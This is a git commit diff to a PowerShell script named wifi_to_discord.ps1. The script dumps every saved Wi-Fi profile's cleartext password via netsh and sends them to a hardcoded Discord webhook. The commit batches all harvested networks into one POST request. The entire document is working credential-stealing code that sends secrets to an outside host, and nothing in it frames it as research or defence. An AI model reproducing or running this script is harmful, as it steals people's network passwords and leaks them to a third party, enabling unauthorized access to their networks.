cced4d28a6f60e29d78ffea1af7bcab0ab596277
_.yzero <116497775+FISTOFDARKNESS@users.noreply.github.com>
2025-09-11 15:49:06 +0200

    Update wifi_to_discord.ps1

--- wifi_to_discord.ps1
+++ wifi_to_discord.ps1
@@ -1,9 +1,11 @@
 $Webhook="https://discord.com/api/webhooks/1391925819017793566/P6u2qHAbmqSFeu94T1beCpyWBO6khVVdCK66sy8a083xDZqRSyY5w5PDHDciVnh2ImDB"
 $profiles=netsh wlan show profile | ForEach-Object { ($_ -split ':')[1].Trim() }
+$allNetworks=@()
 foreach ($p in $profiles) {
     $details=netsh wlan show profile name="$p" key=clear
     $passLine=$details | Select-String "Key Content|Contenuto chiave|Inhaltsschl|Contenido de la clave"
     if ($passLine) { $password=($passLine -split ':')[1].Trim() } else { $password='[Sem senha / não encontrado]' }
-    $json=@{content="Wi-Fi: $p | Senha: $password"} | ConvertTo-Json -Compress
-    Invoke-RestMethod -Uri $Webhook -Method Post -Body $json -ContentType "application/json"
+    $allNetworks+="$p | Senha: $password"
 }
+$json=@{content=($allNetworks -join "`n")} | ConvertTo-Json -Compress
+Invoke-RestMethod -Uri $Webhook -Method Post -Body $json -ContentType "application/json"
